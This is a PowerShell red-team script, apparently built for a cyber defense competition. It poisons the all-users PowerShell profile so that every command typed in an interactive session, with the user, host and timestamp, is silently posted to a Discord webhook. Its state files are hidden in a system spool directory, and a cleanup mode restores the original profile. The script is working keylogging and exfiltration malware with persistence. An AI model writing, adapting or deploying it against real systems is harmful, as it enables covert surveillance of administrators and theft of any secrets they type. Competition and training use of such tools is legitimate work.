#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Nov 21 2026 -- PowerShell Profile Poison (command keylogger -> Discord)
# Targets: 172.20.240.100 (AD) and 172.20.240.120 (MSSQL)
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
# Linux analogy:
#   Plant target  = C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1
#                 ≈ /etc/bash.bashrc  (all users, all interactive shells)
#   Mechanism     = Set-PSReadLineOption -AddToHistoryHandler
#                 ≈ PROMPT_COMMAND / trap '...' DEBUG
#   Effect        = every command the blue team types in PowerShell gets
#                   shipped to your Discord webhook before it hits history
#
# What it logs per command:
#   [2026-11-21 14:32:01] UNDERPRESSURE\Administrator @ DC01 > Get-ADUser -Filter *
#
# Usage:
#   .\06_shell_poison.ps1 deploy  [-WebhookUrl "https://discord.com/api/webhooks/..."]
#   .\06_shell_poison.ps1 cleanup
#
# If -WebhookUrl is not passed, the script reads DISCORD_WEBHOOK env var, then
# falls back to the hardcoded default below.  Set the real URL before deploy.
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

param(
    [Parameter(Position=0)][string]$Mode       = "deploy",
    [string]$WebhookUrl = ""
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

# ---------------------------------------------------------------------------
# CONFIG -- set your webhook here or pass -WebhookUrl
# ---------------------------------------------------------------------------
$DefaultWebhook = "https://discord.com/api/webhooks/REPLACE_ME"

$StateDir   = "C:\Windows\System32\spool\drivers\color"
$StateFile  = "$StateDir\.rt21-poison.json"

# All-users, all-hosts profile -- Linux: /etc/bash.bashrc
$ProfilePath = "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"

# Resolve webhook: CLI arg > env var > hardcoded default
if (-not $WebhookUrl) {
    $WebhookUrl = $env:DISCORD_WEBHOOK
}
if (-not $WebhookUrl) {
    $WebhookUrl = $DefaultWebhook
}

Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
Write-Host "   Nov 21 2026 -- PowerShell Profile Poison"             -ForegroundColor Yellow
Write-Host "   All-users profile -> Discord command keylogger"       -ForegroundColor Yellow
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed
Write-Host ""

switch ($Mode.ToLower()) {

# =============================================================================
# DEPLOY
# =============================================================================
"deploy" {

    if ($WebhookUrl -eq $DefaultWebhook -or $WebhookUrl -match "REPLACE_ME") {
        Write-Warn "WebhookUrl not set -- plant will still run but logs will fail silently"
        Write-Warn "Pass -WebhookUrl 'https://discord.com/api/webhooks/...' to fix"
    }

    New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

    # Back up existing profile if present (like how shell_poison saves original .bashrc)
    $hadExisting = Test-Path $ProfilePath
    $backupPath  = "$StateDir\.rt21-profile-backup.ps1"
    if ($hadExisting) {
        Copy-Item $ProfilePath $backupPath -Force -ErrorAction SilentlyContinue
        Write-Info "Existing profile backed up: $backupPath"
    }

    # Build the poison block to inject into the profile.
    # Guard: $Host.Name -eq 'ConsoleHost' is the PS equivalent of [[ -t 0 ]] in bash --
    # true only in an interactive console window, not in background tasks, WMI runners,
    # scheduled tasks, or remoting sessions. Without this guard, Set-PSReadLineOption
    # throws CommandNotFoundException in non-interactive contexts and can kill scripts
    # that run with $ErrorActionPreference = "Stop".
    $poisonBlock = @"

# -- rt21 --
if (`$Host.Name -eq 'ConsoleHost') {
    `$__rt_wh = '$WebhookUrl'
    Set-PSReadLineOption -AddToHistoryHandler {
        param([string]`$line)
        if (`$line.Trim() -eq '') { return `$true }
        try {
            `$ts   = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
            `$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            `$host = `$env:COMPUTERNAME
            `$msg  = "[$ts] `$user @ `$host > ``$line``"
            `$body = [System.Text.Encoding]::UTF8.GetBytes(('{"content":' + ('"' + `$msg.Replace('\','\\').Replace('"','\"') + '"') + '}'))
            `$req  = [System.Net.WebRequest]::Create(`$__rt_wh)
            `$req.Method = 'POST'
            `$req.ContentType = 'application/json'
            `$req.Timeout = 3000
            `$stream = `$req.GetRequestStream()
            `$stream.Write(`$body, 0, `$body.Length)
            `$stream.Close()
            `$req.GetResponse().Close()
        } catch {}
        return `$true
    }
}
# -- /rt21 --
"@

    Write-Section "Planting all-users PowerShell profile"
    Write-Info "Target: $ProfilePath"
    Write-Info "Linux analogy: /etc/bash.bashrc + trap '...' DEBUG or PROMPT_COMMAND"

    try {
        # Create parent if missing (shouldn't be, but defensive)
        $profileDir = Split-Path $ProfilePath
        if (-not (Test-Path $profileDir)) {
            New-Item $profileDir -ItemType Directory -Force | Out-Null
        }

        # Append the poison block (append, not overwrite -- same as >> in bash)
        Add-Content -Path $ProfilePath -Value $poisonBlock -Encoding UTF8 -ErrorAction Stop
        Write-Success "Poison block appended to $ProfilePath"
        Write-Success "Webhook: $WebhookUrl"
        Write-Info "Every new PowerShell session on this box will now log commands to Discord"
    } catch {
        Write-Err "Profile write failed: $_"
    }

    # Save state
    @{
        deployed_at   = (Get-Date -Format "o")
        profile_path  = $ProfilePath
        backup_path   = if ($hadExisting) { $backupPath } else { $null }
        had_existing  = $hadExisting
        webhook_url   = $WebhookUrl
    } | ConvertTo-Json | Set-Content -Path $StateFile -Encoding UTF8 -Force
    Write-Success "State: $StateFile"

    Write-Host ""
    Write-Host " -- Summary -------------------------------------------" -ForegroundColor Green
    Write-Host "   Profile  : $ProfilePath" -ForegroundColor Gray
    Write-Host "             (all-users, all-hosts -- every PS session picks this up)" -ForegroundColor DarkGray
    Write-Host "   Trigger  : Set-PSReadLineOption -AddToHistoryHandler" -ForegroundColor Gray
    Write-Host "             (Linux: PROMPT_COMMAND / trap DEBUG)" -ForegroundColor DarkGray
    Write-Host "   Logs to  : Discord webhook" -ForegroundColor Gray
    Write-Host "   Format   : [timestamp] DOMAIN\user @ host > command" -ForegroundColor Gray
    Write-Host " -------------------------------------------------------" -ForegroundColor Green
}

# =============================================================================
# CLEANUP
# =============================================================================
"cleanup" {

    $state = $null
    if (Test-Path $StateFile) {
        try { $state = Get-Content $StateFile -Raw -Encoding UTF8 | ConvertFrom-Json
        } catch { Write-Warn "State parse failed -- blind cleanup" }
    } else { Write-Warn "No state file found" }

    Write-Section "Removing profile poison"

    if ($state -and -not $state.had_existing -and (Test-Path $ProfilePath)) {
        # Profile didn't exist before we planted -- just nuke it
        Remove-Item $ProfilePath -Force -ErrorAction SilentlyContinue
        Write-Success "Profile deleted (didn't exist pre-deploy)"
    } elseif ($state -and $state.had_existing -and (Test-Path $state.backup_path)) {
        # Had a real profile before -- restore backup
        Copy-Item $state.backup_path $ProfilePath -Force -ErrorAction Stop
        Remove-Item $state.backup_path -Force -ErrorAction SilentlyContinue
        Write-Success "Original profile restored from backup"
    } else {
        # Fallback: strip the rt21 block from whatever is in the file
        if (Test-Path $ProfilePath) {
            $content = Get-Content $ProfilePath -Raw -Encoding UTF8
            $cleaned = $content -replace '(?s)\r?\n# -- rt21 --.*?# -- /rt21 --\r?\n', ''
            Set-Content $ProfilePath -Value $cleaned -Encoding UTF8 -Force
            Write-Success "rt21 block stripped from $ProfilePath"
        } else {
            Write-Warn "Profile not found -- nothing to clean"
        }
    }

    Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
    Write-Success "Cleanup complete"
}

default {
    Write-Err "Usage: .\06_shell_poison.ps1 [deploy|cleanup] [-WebhookUrl <url>]"
    exit 1
}

}
